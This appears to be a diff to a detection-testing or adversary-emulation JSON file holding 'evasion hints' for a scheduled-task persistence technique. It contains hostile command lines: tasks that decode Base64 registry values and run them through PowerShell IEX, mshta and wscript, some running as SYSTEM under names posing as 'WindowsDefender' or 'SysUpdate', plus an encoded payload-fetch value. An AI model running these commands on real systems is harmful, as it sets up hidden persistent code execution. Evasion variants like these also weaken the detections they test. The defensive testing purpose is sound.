@@ -5,36 +5,18 @@
       "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"SysUpdate\" /TR \"cmd /c start /min \\\"\\\" wscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run).UpdateKey)))\" /sc minute /mo 15",
+        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" wscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 14:30",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c reg add HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v UpdateKey /t REG_SZ /d aW52b2tlLXdlYnJlcXVlc3QgaHR0cDovL2xvY2FsaG9zdDo4MDgwL3BheWxvYWQ= /f"
+        "TargetObject": "HKEY_CURRENT_USER\\\\SOFTWARE\\\\ATOMIC-T1053.005\\\\test"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"WindowsDefender\" /TR \"mshta.exe vbscript:CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{12345678}).Data)))\\\")\" /sc onlogon",
+        "CommandLine": "schtasks.exe /Create /F /TN \"SystemMaintenance\" /TR \"mshta.exe vbscript:Execute(\\\"Set objShell=CreateObject(\\\\\\\"WScript.Shell\\\\\\\"):objShell.Run \\\\\\\"powershell.exe -NoProfile -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\\\\\\\",0\\\")\" /sc onstart /ru SYSTEM",
         "ParentImage": "C:\\Windows\\System32\\explorer.exe",
-        "ParentCommandLine": "explorer.exe"
+        "TargetObject": "HKEY_CURRENT_USER\\\\SOFTWARE\\\\ATOMIC-T1053.005\\\\test"
       },
       "mutation_applied": true
     }
   },
-  "2": {
-    "T1053.005": {
-      "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
-      "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
-      "evasion_hints": {
-        "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" wscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 14:30",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c reg add HKCU\\\\SOFTWARE\\\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f"
-      },
-      "evasion_hints_v2": {
-        "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"SystemMaintenance\" /TR \"mshta.exe vbscript:Execute(\\\"Set objShell=CreateObject(\\\\\\\"WScript.Shell\\\\\\\"):objShell.Run \\\\\\\"powershell.exe -NoProfile -EncodedCommand JABkAGEAdABhAD0AKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABBAFQATwBNAEkAQwAtAFQAMQAwADUAMwAuADAAMAA1ACIAKQAuAHQAZQBzAHQAOwBJAEUAWAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAENvAG4AdgBlAHIAdAAuAEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGQAYQB0AGEAKQApACkA\\\\\\\",0\\\\\\\")\\\")\",/sc onstart /ru SYSTEM",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "ParentCommandLine": "C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
-      },
-      "mutation_applied": true
-    }
-  }
+  "2": {}
 }
